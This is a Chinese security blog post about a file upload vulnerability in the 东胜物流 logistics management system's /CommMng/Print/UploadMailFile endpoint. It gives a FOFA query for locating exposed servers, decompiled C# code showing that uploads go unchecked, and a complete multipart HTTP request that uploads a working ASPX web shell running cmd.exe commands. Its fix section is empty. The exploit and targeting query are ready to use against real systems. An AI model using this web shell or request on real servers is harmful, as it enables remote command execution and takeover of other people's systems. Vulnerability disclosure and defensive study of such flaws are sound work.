---
title: "东胜物流 /CommMng/Print/UploadMailFile 文件上传漏洞"
source: https://mrxn.net/jswz/dongsheng-CommMng-Print-UploadMailFile-RCE.html
asset_dir: assets/东胜物流-commmngprintuploadmailfile-文件上传漏洞
---

# 东胜物流 /CommMng/Print/UploadMailFile 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/10 08:31
* 292浏览
* [0评论](#comment)
* 52分钟阅读

深入探索

Server

SQL

服务器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

东胜物流是一款专为物流企业设计的管理系统，提供多种功能以支持物流企业的日常运营。东胜物流系统中的 /CommMng/Print/UploadMailFile 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可以通过该接口上传恶意文件，可能导致服务器被控制或任意[代码执行](https://mrxn.net/tag/rce)，对系统构成严重的安全威胁。

漏洞修复方案

# 影响版本

# fofa语法

> (body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css") && body="东胜"
>
> 计算机服务器

# 漏洞分析

根据.NET MVC框架特点找到DSWeb.CommMng中对于路由的定义

```
using System.Web.Mvc;

#nullable disable
namespace DSWeb.Areas.CommMng;

public class CommMngAreaRegistration : AreaRegistration
{
  public override string AreaName => "CommMng";

  public override void RegisterArea(AreaRegistrationContext context)
  {
    context.MapRoute("CommMng_default", "CommMng/{controller}/{action}/{id}", (object) new
    {
      action = "Index",
      id = UrlParameter.Optional
    });
  }
}
```

深入探索

技术文章订阅

SQL注入防护

Docker加速服务

在DSWeb.CommMng.Controllers下找到**PrintController**里的**UploadMailFile()**方法

```
[HttpPost]
public ContentResult UploadMailFile()
{
  JsonResponse jsonResponse = new JsonResponse()
  {
    Success = false,
    Message = ""
  };
  if (((NameObjectCollectionBase) this.Request.Files).Count != 1)
  {
    jsonResponse.Success = false;
    jsonResponse.Message = "请选择上传的文件";
    return new ContentResult()
    {
      Content = JsonConvert.Serialize<JsonResponse>(jsonResponse)
    };
  }
  HttpPostedFileBase file = this.Request.Files["LoadFile"];
  if (file == null)
  {
    jsonResponse.Success = false;
    jsonResponse.Message = "上传文件发生未知错误，请重新上传";
    return new ContentResult()
    {
      Content = JsonConvert.Serialize<JsonResponse>(jsonResponse)
    };
  }
  string str1 = this.Server.MapPath("../../UploadFiles/MailFile");
  if (!Directory.Exists(str1))
    Directory.CreateDirectory(str1);
  int contentLength = file.ContentLength;
  string fileName = Path.GetFileName(file.FileName);
  string str2 = this.Request.Form["bsno"];
  string cookieUserCode = CookieConfig.GetCookie_UserCode(this.Request);
  string str3 = $"{str1}\\{cookieUserCode}{DateTime.Now.ToString("yyyyMMddHHmmssfff")}{fileName}";
  if (System.IO.File.Exists(str3))
    System.IO.File.Delete(str3);
  file.SaveAs(str3);
  if (!System.IO.File.Exists(str3))
  {
    jsonResponse.Success = false;
    jsonResponse.Message = "上传文件出错";
    return new ContentResult()
    {
      Content = JsonConvert.Serialize<JsonResponse>(jsonResponse)
    };
  }
  string str4 = "../../UploadFiles/MailFile/" + Path.GetFileName(str3);
  try
  {
    string str5 = JsonConvert.Serialize(new
    {
      success = true,
      Message = "上传成功",
      data = str4
    });
    return new ContentResult() { Content = str5 };
  }
  catch (Exception ex)
  {
    jsonResponse.Success = false;
    jsonResponse.Message = "上传文件出错";
    return new ContentResult()
    {
      Content = JsonConvert.Serialize<JsonResponse>(jsonResponse)
    };
  }
}
```

注意其中关键部分

安全运维咨询

```
┌─────────────────────────────────────────────────────────────┐
│                    攻击者上传 shell.aspx                      │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  Request.Files["LoadFile"] 获取文件                         │
│  ✗ 未检查扩展名 (.aspx 直接通过)                             │
│  ✗ 未检查 MIME 类型                                         │
│  ✗ 未检查文件内容                                            │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  file.SaveAs() 保存到 /UploadFiles/MailFile/xxx.aspx        │
│  返回相对路径给攻击者                                        │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  攻击者访问 /UploadFiles/MailFile/xxx.aspx?cmd=whoami       │
│  → 服务器执行命令，返回结果                                   │
│  → 获取服务器完全控制权                                       │
└─────────────────────────────────────────────────────────────┘
```

1. `cookieUserCode` **可控性**：如果 `CookieConfig.GetCookie_UserCode` 未对返回值进行校验，且 Cookie 值可被伪造
2. **未过滤路径字符**：如果 `cookieUserCode` 可包含 `..\\` 或 `..//`，则可突破目标目录
3. **无扩展名验证**：代码未对[上传文件](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)的扩展名进行任何白名单或黑名单检查
4. **保存路径可知**：上传成功后直接返回文件相对路径 `str4`
5. **存放于 Web 可访问目录**：`../../UploadFiles/MailFile` WEB根目录下

# 漏洞复现

```
POST /CommMng/Print/UploadMailFile HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: multipart/form-data; boundary=----Boundary123

------Boundary123
Content-Disposition: form-data; name="LoadFile"; filename="shell.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
    string c = Request["cmd"];
    if(c != null){
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
------Boundary123--
```

[![东胜物流 /CommMng/Print/UploadMailFile 文件上传漏洞](images/img-001-d3120032964a.webp)](https://image.mrxn.net/e7537cb977004bbeb83eecabe4993e48.webp)

响应回显文件路径即可执行命令

漏洞修复方案

[![东胜物流 /CommMng/Print/UploadMailFile 文件上传漏洞](images/img-002-003cf2fa1b46.webp)](https://image.mrxn.net/f10ef9d65d1048e7ad82df227b2a685a.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[东胜物流 /CommMng/Print/UploadMailFile 文件上传漏洞](https://mrxn.net/jswz/dongsheng-CommMng-Print-UploadMailFile-RCE.html)  
文章链接：<https://mrxn.net/jswz/dongsheng-CommMng-Print-UploadMailFile-RCE.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全运维咨询

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-CommMng-Print-UploadMailFile-RCE.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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